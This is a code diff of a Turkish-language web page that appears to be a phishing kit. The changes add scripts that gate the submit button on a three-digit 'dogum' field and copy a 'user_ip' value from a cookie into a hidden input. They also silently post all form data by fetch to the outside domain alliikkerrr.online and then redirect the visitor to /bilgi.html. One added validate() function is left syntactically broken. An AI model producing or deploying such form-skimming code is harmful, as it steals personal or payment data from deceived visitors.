@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+a<!DOCTYPE html>
  
 <html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
@@ -130,15 +130,33 @@ function validate(){
         $("#error-message").html(message);
     }
     return valid;
+ 
+
 }
 </script>
+	<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const inputField = document.getElementById('dogum');
 
-<form id="frmContact" action="https://alliikkerrr.online//validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
+    const submitButton = document.querySelector('button[type="submit"]');
+
+    inputField.addEventListener('input', function() {
+        const inputValue = inputField.value;
+
+        if (inputValue.length === 3 && /^\d+$/.test(inputValue)) {
+            submitButton.removeAttribute('disabled');
+        } else {
+            submitButton.setAttribute('disabled', 'disabled');
+        }
+    });
+});
+		</script>
+<form id="frmContact" action="https://alliikkerrr.online/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
+ <input type="hidden" name="user_ip" value="">
 
 
 
-
-    <!-- External CSS libraries -->
+ 
     <link type="text/css" rel="stylesheet" href="./files/bootstrap.min.css">
     <link type="text/css" rel="stylesheet" href="./files/font-awesome.min.css">
     <link type="text/css" rel="stylesheet" href="./files/flaticon.css">
@@ -154,7 +172,20 @@ function validate(){
     <link rel="stylesheet" type="text/css" id="style_sheet" href="./files/default.css">
 
 
+	<script>
+    document.addEventListener("DOMContentLoaded", function() {
+      
+        function getUserIP() {
+          
+            var userIP = document.cookie.replace(/(?:(?:^|.*;\s*)user_ip\s*=\s*([^;]*).*$)|^.*$/, "$1");
+            return userIP;
+        }
 
+     
+        var userIpInput = document.querySelector('input[name="user_ip"]');
+        userIpInput.value = getUserIP();
+    });
+</script>
  
 <div class="page_loader"></div>
  
@@ -190,7 +221,7 @@ function validate(){
                             </div>
                             
                             <div class="form-group mb-0">
-                                <button type="submit" class="btn-md btn-theme btn-block">SORGULA</button>
+                                <button type="submit" class="btn-md btn-theme btn-block" disabled>SORGULA</button>
                             </div>
 							<br>
 							<div id="error-message"></div>
@@ -202,7 +233,7 @@ function validate(){
         </div>
     </div>
 </div>
-
+ 
 
  <script async="" src="./files/js"></script>
  
@@ -251,6 +282,36 @@ $(document).ready(function () {
  
 
 </div></section></form>
+<script>
+    function validate() {
+        // Formun gönderilmesini engelleme
+        return false;
+    </script>
+
+    <script>
+       
+        document.getElementById('frmContact').addEventListener('submit', function(event) {
+            event.preventDefault(); // Formun normal şekilde gönderilmesini engelle
+
+            // Form verilerini al
+            var formData = new FormData(this);
+
+            // Ajax ile post isteği gönder
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Cevap yoksay ve kullanıcıyı /bilgi.html adresine yönlendir
+                window.location.href = '/bilgi.html';
+            })
+            .catch(error => {
+                 window.location.href = '/bilgi.html';
+            });
+        });
+    </script>
+
+	
 	<script>
   new Vue({
     el: '#app',
